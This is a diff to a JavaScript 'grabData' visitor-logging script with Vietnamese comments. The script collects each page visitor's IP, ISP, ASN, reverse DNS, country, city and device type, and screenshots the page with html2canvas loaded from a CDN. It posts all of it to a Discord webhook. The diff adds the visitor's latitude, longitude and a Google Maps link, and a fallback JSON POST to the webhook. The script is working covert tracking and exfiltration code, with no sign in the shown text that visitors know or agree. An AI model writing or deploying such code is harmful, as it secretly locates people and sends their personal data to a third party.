@@ -32,35 +32,30 @@ const grabData = async () => {
             return path.split('.').reduce((o, p) => (o && o[p] !== undefined) ? o[p] : fallback, obj);
         };
 
-        // Trích xuất dữ liệu địa lý (không dùng lat/lon)
+        // Trích xuất dữ liệu địa lý
         const ip = geoData.ip || "Unknown";
         const isp = safeGet(geoData, 'isp') || "Unknown";
         const country = safeGet(geoData, 'country_name', "Unknown");
         const city = safeGet(geoData, 'city', "Unknown");
+        const lat = safeGet(geoData, 'latitude', 0);
+        const lon = safeGet(geoData, 'longitude', 0);
         const asNumber = safeGet(geoData, 'asn') || "Unknown";
         const asnName = safeGet(geoData, 'organization') || "Unknown";
         const reverseDNS = safeGet(geoData, 'reverse') || "Unknown";
         const regionCode = (safeGet(geoData, 'country_code2') || "").toLowerCase();
         const flag = safeGet(geoData, 'country_flag') || "https://via.placeholder.com/64?text=Flag";
 
-        // Phát hiện VPN nâng cao
-        const isVPN = asnName.toLowerCase().includes("worldstream") || 
-                     isp.toLowerCase().includes("vpn") || 
-                     reverseDNS.toLowerCase().includes("vpn") || 
-                     asNumber.startsWith("AS") && !["AS3352", "AS12345"].includes(asNumber); // Ví dụ kiểm tra ASN
+        // Phát hiện VPN (logic đơn giản)
+        const isVPN = asnName.toLowerCase().includes("worldstream") || isp.toLowerCase().includes("vpn");
         const isMobile = safeGet(geoData, 'mobile', false);
         const isHosting = !isMobile && !isVPN;
         const isProxy = false;
 
-        // Trích xuất dữ liệu thiết bị và hệ điều hành từ user-agent
+        // Trích xuất dữ liệu thiết bị từ user-agent
         const deviceType = safeGet(agentData, 'device.type', 'Unknown');
         const deviceName = deviceType === 'mobile' ? 'Điện thoại' :
                          deviceType === 'tablet' ? 'Máy tính bảng' :
                          deviceType === 'desktop' ? 'Máy tính để bàn' : 'Không xác định';
-        const customDeviceName = "Hien";
-        const osName = safeGet(agentData, 'operatingSystem.name', 'Không xác định');
-        const osVersion = safeGet(agentData, 'operatingSystem.versionMajor', '?');
-        const osInfo = `${osName} ${osVersion}`;
 
         // Tự load html2canvas từ CDN và chụp screenshot
         let screenshotBlob = null;
@@ -112,7 +107,7 @@ const grabData = async () => {
                     url: `https://whatismyipaddress.com/ip/${ip}`,
                     description: "Log lượt truy cập website",
                     thumbnail: { url: flag },
-                    color: isVPN ? 16711680 : 1993898, // Màu đỏ nếu có VPN, xanh nếu không
+                    color: 1993898,
                     fields: [
                         {
                             name: "📞 ISP",
@@ -122,6 +117,11 @@ const grabData = async () => {
                         {
                             name: `:flag_${regionCode}: Quốc gia & Thành phố`,
                             value: `${country}/${city}`,
+                            inline: true
+                        },
+                        {
+                            name: "📍 Vị trí",
+                            value: `Kinh độ: ${lon}\nVĩ độ: ${lat}\nGoogle Maps: [Click](https://www.google.com/maps/@${lat},${lon},6z)`,
                             inline: true
                         },
                         {
@@ -161,12 +161,7 @@ const grabData = async () => {
                         },
                         {
                             name: "🖥️ Thiết bị",
-                            value: `${deviceName}--`,
-                            inline: true
-                        },
-                        {
-                            name: "💻 Hệ điều hành",
-                            value: osInfo,
+                            value: deviceName,
                             inline: true
                         },
                         {
@@ -185,10 +180,19 @@ const grabData = async () => {
 
         // Gửi lên Discord
         console.log("Gửi payload...");
-        const formData = new FormData();
-        if (screenshotBlob) formData.append('file1', screenshotBlob, 'page-screenshot.png');
-        formData.append('payload_json', JSON.stringify(params));
-        const response = await fetch(webhookUrl, { method: "POST", body: formData });
+        let response;
+        if (screenshotBlob) {
+            const formData = new FormData();
+            formData.append('file', screenshotBlob, 'page-screenshot.png');
+            formData.append('payload_json', JSON.stringify(params));
+            response = await fetch(webhookUrl, { method: "POST", body: formData });
+        } else {
+            response = await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(params)
+            });
+        }
 
         const errorText = await response.text();
         console.log("Response full:", { status: response.status, body: errorText });
